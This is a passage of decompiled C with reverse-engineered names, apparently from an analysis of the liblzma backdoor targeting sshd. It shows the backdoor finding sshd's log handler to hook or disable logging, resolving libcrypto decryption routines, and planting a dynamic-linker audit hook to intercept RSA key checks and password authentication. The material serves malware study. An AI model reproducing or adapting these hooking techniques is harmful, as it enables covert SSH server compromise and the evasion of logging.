                if (((local_9d8.prefix.flags_u16 & 0x1000) != 0) &&
                   (uVar58 = local_9d8.imm64_reg, (local_9d8.prefix.flags_u16 & 0x20) != 0)) {
                  bVar24 = (char)local_9d8.prefix.decoded.rex << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                uVar58 = local_9d8.prefix.decoded.modrm.breakdown.modrm_reg;
                if ((local_9d8.prefix.flags_u16 & 0x20) != 0) {
                  bVar24 = (char)local_9d8.prefix.decoded.rex * '\x02';
LAB_001068e4:
                  uVar58 = uVar58 | bVar24 & 8;
                }
              }
            }
            puVar55 = puVar60;
            if ((uVar59 == uVar58) && ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
              puVar46 = (u8 *)local_9d8.mem_disp;
              if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                puVar46 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                          CONCAT44(local_9d8.instruction_size._4_4_,
                                   (undefined4)local_9d8.instruction_size);
              }
              local_a90 = 0;
              puVar44 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
              if ((((puVar44 == (u8 *)0x0) || (puVar44 + local_a90 <= puVar46)) ||
                  (puVar46 < puVar44)) ||
                 (((puVar46 == puVar60 && (puVar46 == puVar47)) ||
                  (puVar55 = puVar46, puVar47 != (u8 *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              puVar46 = puVar47;
              puVar60 = puVar55;
            }
            puVar55 = local_9d8.instruction +
                      CONCAT44(local_9d8.instruction_size._4_4_,
                               (undefined4)local_9d8.instruction_size);
            puVar47 = puVar46;
          }
          if ((puVar47 == (u8 *)0x0) || (puVar60 == (u8 *)0x0)) {
LAB_00106ab1:
            puVar60 = (u8 *)0x0;
            local_b20 = (u8 *)0x0;
          }
          else {
LAB_00106b3c:
            BVar26 = validate_log_handler_pointers
                               (puVar47,puVar60,pvVar27,(u8 *)((long)pvVar27 + uVar10),
                                &local_980.string_refs,ctx);
            local_b20 = puVar47;
            if (BVar26 != FALSE) {
              psVar53->log_handler_ptr = puVar47;
              peVar31 = &local_980.main_info;
              psVar53->log_handler_ctx_ptr = puVar60;
              psVar53->log_hooking_possible = TRUE;
              local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x708);
              pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
              psVar53->STR_percent_s = pcVar37;
              if (pcVar37 != (char *)0x0) {
                local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x790);
                pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                psVar53->STR_Connection_closed_by = pcVar37;
                if (pcVar37 != (char *)0x0) {
                  local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x4f0);
                  pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                  psVar53->STR_preauth = pcVar37;
                  if (pcVar37 != (char *)0x0) {
                    local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0x1d8);
                    pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                    psVar53->STR_authenticating = pcVar37;
                    if (pcVar37 != (char *)0x0) {
                      local_9d8.instruction = (u8 *)CONCAT44(local_9d8.instruction._4_4_,0xb10);
                      pcVar37 = elf_find_string(peVar31,(EncodedStringId *)&local_9d8,(void *)0x0);
                      psVar53->STR_user = pcVar37;
                      if (pcVar37 != (char *)0x0) break;
                    }
                  }
                }
              }
              psVar53->logging_disabled = TRUE;
              break;
            }
          }
        }
        else if ((((local_a30._40_4_ == 0x147) &&
                  ((uint)local_a30.prefix.decoded.modrm >> 8 == 0x50000)) &&
                 ((local_a30.prefix.flags_u16 & 0x800) != 0)) &&
                (local_a30.operand_zeroextended == 0)) {
          puVar47 = (u8 *)0x0;
          if ((local_a30.prefix.flags_u16 & 0x100) != 0) {
            puVar47 = local_a30.instruction + local_a30.instruction_size + local_a30.mem_disp;
          }
          local_9d8.instruction = (u8 *)0x0;
          puVar55 = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)&local_9d8,FALSE);
          if (((puVar55 != (u8 *)0x0) && (puVar47 < local_9d8.instruction + (long)puVar55)) &&
             (puVar55 <= puVar47)) {
            pdVar56 = &local_9d8;
            for (lVar45 = 0x16; puVar60 = local_b48, lVar45 != 0; lVar45 = lVar45 + -1) {
              *(undefined4 *)&pdVar56->instruction = 0;
              pdVar56 = (dasm_ctx_t *)((long)pdVar56 + (ulong)bVar62 * -8 + 4);
            }
            do {
              BVar26 = find_instruction_with_mem_operand_ex
                                 (puVar60,(u8 *)local_980.string_refs.entries[0x1a].func_end,
                                  &local_9d8,0x147,(void *)0x0);
              if (BVar26 == FALSE) break;
              if ((local_9d8.operand_zeroextended == 0) &&
                 ((local_9d8.prefix.flags_u16 & 0x100) != 0)) {
                puVar60 = (u8 *)local_9d8.mem_disp;
                if (((uint)local_9d8.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                  puVar60 = (u8 *)(local_9d8.mem_disp + (long)local_9d8.instruction) +
                            CONCAT44(local_9d8.instruction_size._4_4_,
                                     (undefined4)local_9d8.instruction_size);
                }
                local_a90 = 0;
                puVar55 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,FALSE);
                if ((((puVar55 != (u8 *)0x0) && (puVar60 < puVar55 + local_a90)) &&
                    (puVar55 <= puVar60)) && (puVar47 != puVar60)) goto LAB_00106b3c;
              }
              puVar60 = local_9d8.instruction +
                        CONCAT44(local_9d8.instruction_size._4_4_,
                                 (undefined4)local_9d8.instruction_size);
            } while (local_9d8.instruction +
                     CONCAT44(local_9d8.instruction_size._4_4_,
                              (undefined4)local_9d8.instruction_size) <
                     local_980.string_refs.entries[0x1a].func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        local_b48 = local_b48 + local_a30.instruction_size;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  plVar30->opaque = local_980.elf_handles.libcrypto;
  if (pEVar36 != (Elf64_Sym *)0x0) {
    EVar15 = pEVar36->st_value;
    pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
    *puVar1 = *puVar1 + 1;
    (local_b10->imported_funcs).EVP_DecryptUpdate =
         (pfn_EVP_DecryptUpdate_t)(pEVar16->e_ident + EVar15);
  }
  if (pEVar39 != (Elf64_Sym *)0x0) {
    EVar15 = pEVar39->st_value;
    pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
    *puVar1 = *puVar1 + 1;
    (local_b10->imported_funcs).EVP_DecryptFinal_ex =
         (pfn_EVP_DecryptFinal_ex_t)(pEVar16->e_ident + EVar15);
  }
  BVar26 = init_imported_funcs(imported_funcs);
  if (((((((BVar26 != FALSE) &&
          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,plVar30),
          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
         (BVar26 = secret_data_append_from_address
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
         BVar26 != FALSE)) &&
        ((BVar26 = secret_data_append_from_address
                             (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a,4,
                              0x12), BVar26 != FALSE &&
         (BVar26 = secret_data_append_item
                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                              (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar26 != FALSE))
        )) && (BVar26 = secret_data_append_from_address
                                  (params->shared->hook_EVP_PKEY_set1_RSA,
                                   (secret_data_shift_cursor_t)0x132,6,0x14), BVar26 != FALSE)) &&
      ((BVar26 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar26 != FALSE &&
       (BVar26 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar26 != FALSE)))) &&
     ((BVar26 = secret_data_append_item
                          ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                           (u8 *)params->hook_params->mm_answer_keyverify), BVar26 != FALSE &&
      (((BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar26 != FALSE &&
        (BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                             (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
       ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
    local_980.main_map = local_980.main_map + local_ac8 + 8;
    uVar5 = *(u32 *)local_980.main_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.main_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = uVar5;
    *(u32 *)local_980.main_map = 2;
    pbVar18 = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *pbVar18 = *pbVar18 | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    local_980.libcrypto_map = local_980.libcrypto_map + local_ac8 + 8;
    uVar5 = *(u32 *)local_980.libcrypto_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = uVar5;
    paVar2 = &(local_b10->ldso_ctx).hooked_audit_ifaces;
    *(u32 *)local_980.libcrypto_map = 1;
    paVar57 = paVar2;
    for (lVar45 = 0x1e; lVar45 != 0; lVar45 = lVar45 + -1) {
      *(undefined4 *)&paVar57->activity = 0;
      paVar57 = (audit_ifaces *)((long)paVar57 + (ulong)bVar62 * -8 + 4);
    }
    (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
         (audit_symbind_fn_t)params->hook_params->symbind64;
    *(local_b10->ldso_ctx)._dl_audit_ptr = paVar2;
    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
    lVar45 = 0;
    plVar28 = local_980.import_resolver;
    while (plVar28 != (lzma_allocator *)0x0) {
      *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45) =
           *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar45);
      plVar28 = (lzma_allocator *)(lVar45 + -0x17);
      lVar45 = lVar45 + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  plVar28 = &local_980.fake_allocator;
  init_ldso_ctx(&local_b10->ldso_ctx);
  lVar45 = 0;
  plVar30 = local_980.import_resolver;
  while (plVar30 != (lzma_allocator *)0x0) {
    *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45) =
         *(undefined1 *)((long)&plVar28->alloc + lVar45);
    plVar30 = (lzma_allocator *)(lVar45 + -0x17);
    lVar45 = lVar45 + 1;
  }
LAB_00105a81:
  peVar49 = params->entry_ctx;
  (peVar49->got_ctx).got_ptr = (void *)0x0;
  (peVar49->got_ctx).return_address = (void *)0x0;
  (peVar49->got_ctx).cpuid_fn = (void *)0x0;
  (peVar49->got_ctx).got_offset = 0;
  peVar49->symbol_ptr = (void *)0x1;
  piVar43 = (int *)cpuid_basic_info(0);
  if (*piVar43 != 0) {
    puVar19 = (undefined4 *)cpuid_Version_info(1);
    uVar20 = puVar19[1];
    uVar21 = puVar19[2];
    uVar22 = puVar19[3];
    *(undefined4 *)&(peVar49->got_ctx).got_ptr = *puVar19;
    *(undefined4 *)&(peVar49->got_ctx).return_address = uVar20;
    *(undefined4 *)&(peVar49->got_ctx).cpuid_fn = uVar22;
    *(undefined4 *)&(peVar49->got_ctx).got_offset = uVar21;
  }
  return FALSE;
}

